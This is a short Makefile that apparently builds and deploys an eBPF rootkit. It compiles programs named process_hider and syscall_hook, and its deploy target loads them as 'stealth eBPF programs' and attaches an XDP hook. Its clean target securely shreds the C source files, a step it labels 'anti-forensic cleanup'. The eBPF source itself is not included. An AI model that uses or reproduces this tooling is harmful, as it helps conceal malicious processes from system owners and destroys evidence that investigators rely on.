CLANG ?= clang-15
LLC ?= llc-15
BPFTOOL ?= bpftool
KERNEL_DIR ?= /lib/modules/$(shell uname -r)/build

CFLAGS := -O2 -g -Wall -target bpf -D__TARGET_ARCH_x86_64

all: process_hider.bpf.o syscall_hook.bpf.o

%.bpf.o: %.bpf.c
	$(CLANG) $(CFLAGS) -c $< -o $@
	$(BPFTOOL) gen skeleton $@ name $(basename $@) > $(basename $@).skel.h

clean:
	rm -f *.o *.skel.h
	shred -u *.c  # Anti-forensic cleanup

deploy:
	@echo "[+] Loading stealth eBPF programs..."
	$(BPFTOOL) prog loadall process_hider.bpf.o /sys/fs/bpf/ghost_ebpf
	$(BPFTOOL) net attach xdp /sys/fs/bpf/ghost_ebpf/xdp_prog dev lo

.PHONY: all clean deploy